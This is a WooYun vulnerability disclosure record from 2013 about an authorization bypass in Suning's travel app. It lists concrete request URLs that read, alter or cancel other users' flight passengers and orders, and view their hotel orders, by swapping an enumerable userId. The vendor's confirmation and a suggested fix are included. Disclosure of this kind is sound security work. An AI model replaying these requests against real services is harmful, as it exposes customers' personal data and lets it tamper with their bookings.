{"id": 10492, "wybug_id": "wooyun-2013-028045", "wybug_title": "苏宁旅行之越权完全版", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "小胖胖要减肥", "wybug_date": "2013-07-07 09:20", "wybug_open_date": "2013-08-21 09:21", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "认证设计不合理", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-21：\t细节向公众公开  简要描述： 产品设计问题利用难度：较高     影响：严重    涉及范围：广 详细说明：  测试了旅行客户端的机票，和酒店都存在这个问题把客户信息安全和操作安全全部放在了一个可能存在规律或者直接可以遍历的userid上可以通过返回数据长度遍历找到可使用的id，遍历时通过注册的id大概规律设置\nuserId=41047207194  13813814801  操作账号\n\nuserId=43047313758  13813814802 登陆账号\n苏宁机票：\n增加乘客  http://jipiao.suning.com/vgs-web/mobile/oct/modifyTraveller.htmtravellerId=80976&userId=41047207194&travellerType=1&firstName=%25E5%25BE%2597%25E9%25A2%259D%25E5%25B0%25B1&cardType=6&idCode=4664644&birthday=\n\n删除乘客 http://jipiao.suning.com/vgs-web/mobile/oct/deleteTraveller.htmtravellerNum=1&travellerId0=80976&userId=41047207194\n\n读取预定人  http://jipiao.suning.com/vgs-web/mobile/oct/viewTraveller.htmuserId=41047207194\n\n查看订单 http://jipiao.suning.com/vgs-web/mobile/oct/orderList.htmuserId=41047207194&dateLimits=1&currentPage=1&orderStatus=0\n\n查看订单详情 http://jipiao.suning.com/vgs-web/mobile/oct/orderInfo.htmuserId=41047207194&orderId=87500\n\n取消订单 http://jipiao.suning.com/vgs-web/mobile/oct/cancelOrder.htmuserId=41047207194&orderId=87500\n苏宁酒店订单\n查看订单详情 http://jiudian.suning.com/hotelpay-web/hotelTerminal/fnd/searchHotelOrders.htmmemberId=40047641116&currentPage=1&pageSize=10&orderStatusCriteria=&howLong=2\n   漏洞证明：  如下图2可知，通过usrid即可得到所有订单号\n\n\n\n\n\n\n\n\n\n   修复方案：  1 简单的就是加表单hash或token2 或者直接使用客户端独设计，appsign和appkey  2个参数去控制是否是当前用户，道理和cookies的sessionid一样   版权声明：转载请注明来源 小胖胖要减肥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-07-08 11:34 厂商回复： 多谢大侠 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}